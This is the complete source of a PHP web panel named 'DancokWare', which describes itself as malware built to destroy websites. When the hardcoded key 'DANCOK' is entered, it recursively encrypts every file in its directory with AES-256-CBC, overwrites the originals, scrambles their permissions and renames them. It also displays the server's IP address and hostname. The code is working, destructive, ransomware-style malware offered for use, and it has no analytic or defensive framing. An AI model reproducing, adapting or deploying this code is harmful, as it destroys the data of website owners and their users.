<?php
function encryptFile($file, $key) {
    $contents = file_get_contents($file);
    $encrypted = base64_encode(openssl_encrypt($contents, 'AES-256-CBC', $key, 0, substr(hash('sha256', $key), 0, 16)));
    file_put_contents($file, $encrypted);
}

function encryptDirectory($dir, $key) {
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
            $path = $dir . DIRECTORY_SEPARATOR . $file;
            if (is_dir($path)) {
                encryptDirectory($path, $key);
            } else {
                encryptFile($path, $key);
                chmod($path, rand(0000, 0777)); // Randomize file permissions
                $encryptedName = base64_encode(openssl_encrypt($file, 'AES-256-CBC', $key, 0, substr(hash('sha256', $key), 0, 16)));
                rename($path, $dir . DIRECTORY_SEPARATOR . $encryptedName);
            }
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = $_POST['prompt'];
    $key = 'DANCOK'; // Replace with your desired key

    if ($input === $key) {
        $directory = __DIR__; // Encrypt the current directory
        encryptDirectory($directory, $key);
        echo "<h1 style='color: red;'>Encryption Successful!</h1>";
    } else {
        echo "<h1 style='color: red;'>Invalid Key!</h1>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DancokWare</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: "Courier New", monospace;
            text-align: center;
        }
        pre {
            color: #00FF00;
        }
        .malware-info {
            color: gold;
            font-size: 18px;
            font-weight: bold;
        }
        .server-info {
            margin-top: 20px;
            color: white;
            font-size: 14px;
        }
        .form-container {
            margin-top: 20px;
        }
        .form-container p {
            color: white;
            font-size: 16px;
            margin-bottom: 10px;
        }
        input[type="text"] {
            width: 60%;
            padding: 12px;
            font-size: 16px;
            border: 2px solid #00FF00;
            border-radius: 5px;
            background-color: black;
            color: white;
            outline: none;
            transition: box-shadow 0.3s ease;
        }
        input[type="text"]:focus {
            box-shadow: 0 0 10px #00FF00;
        }
        button {
            padding: 12px 20px;
            font-size: 16px;
            background-color: black;
            color: #00FF00;
            border: 2px solid #00FF00;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 15px;
        }
        button:hover {
            background-color: #00FF00;
            color: black;
        }
        .warning {
            color: red;
            font-size: 14px;
            margin-top: 10px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <!-- ASCII Art -->
    <pre>
▓█████▄  ▄▄▄       ███▄    █  ▄████▄   ▒█████   ██ ▄█▀ █     █░ ▄▄▄       ██▀███  ▓█████ 
▒██▀ ██▌▒████▄     ██ ▀█   █ ▒██▀ ▀█  ▒██▒  ██▒ ██▄█▒ ▓█░ █ ░█░▒████▄    ▓██ ▒ ██▒▓█   ▀ 
░██   █▌▒██  ▀█▄  ▓██  ▀█ ██▒▒▓█    ▄ ▒██░  ██▒▓███▄░ ▒█░ █ ░█ ▒██  ▀█▄  ▓██ ░▄█ ▒▒███   
░▓█▄   ▌░██▄▄▄▄██ ▓██▒  ▐▌██▒▒▓▓▄ ▄██▒▒██   ██░▓██ █▄ ░█░ █ ░█ ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄ 
░▒████▓  ▓█   ▓██▒▒██░   ▓██░▒ ▓███▀ ░░ ████▓▒░▒██▒ █▄░░██▒██▓  ▓█   ▓██▒░██▓ ▒██▒░▒████▒
 ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ░▒ ▒  ░░ ▒░▒░▒░ ▒ ▒▒ ▓▒░ ▓░▒ ▒   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░
 ░ ▒  ▒   ▒   ▒▒ ░░ ░░   ░ ▒░  ░  ▒     ░ ▒ ▒░ ░ ░▒ ▒░  ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░
 ░ ░  ░   ░   ▒      ░   ░ ░ ░        ░ ░ ░ ▒  ░ ░░ ░   ░   ░    ░   ▒     ░░   ░    ░   
   ░          ░  ░         ░ ░ ░          ░ ░  ░  ░       ░          ░  ░   ░        ░  ░
 ░                           ░                                                           
    </pre>

    <!-- Informasi Tambahan -->
    <div class="malware-info">
        MALWARE CREATED BY FIDZXPLOIT<br>
        INDOHAXSEC TEAM
    </div>

    <!-- Informasi Server -->
    <div class="server-info">
        <?php
        $server_ip = $_SERVER['SERVER_ADDR'];
        $server_name = $_SERVER['SERVER_NAME'];
        $current_time = date('Y-m-d H:i:s');
        echo "Website: $server_name<br>";
        echo "IP Server: $server_ip<br>";
        echo "Current Time: $current_time<br>";
        ?>
    </div>

    <!-- Form Input -->
    <div class="form-container">
        <p>Please enter the key to encrypt the files:</p>
        <form method="POST">
            <input type="text" name="prompt" placeholder="Enter the key" required>
            <button type="submit">RUN</button>
        </form>
        <div class="warning">
            This malware is designed to destroy websites. All actions are illegal. Think carefully about your actions!
        </div>
    </div>
</body>
</html>
